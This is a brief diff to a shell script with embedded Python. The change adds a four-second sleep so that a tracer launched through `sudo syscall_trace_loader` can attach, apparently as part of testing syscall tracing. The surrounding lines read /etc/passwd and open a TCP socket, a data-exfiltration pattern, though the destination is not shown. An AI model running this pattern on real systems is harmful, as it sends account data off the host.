@@ -5,6 +5,10 @@ set -euo pipefail
 exec python3 - <<'PY'
 import pathlib
 import socket
+import time
+
+# Wait for `sudo syscall_trace_loader` to attach (password prompt delay).
+time.sleep(4)
 
 data = pathlib.Path("/etc/passwd").read_text()[:4000]
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
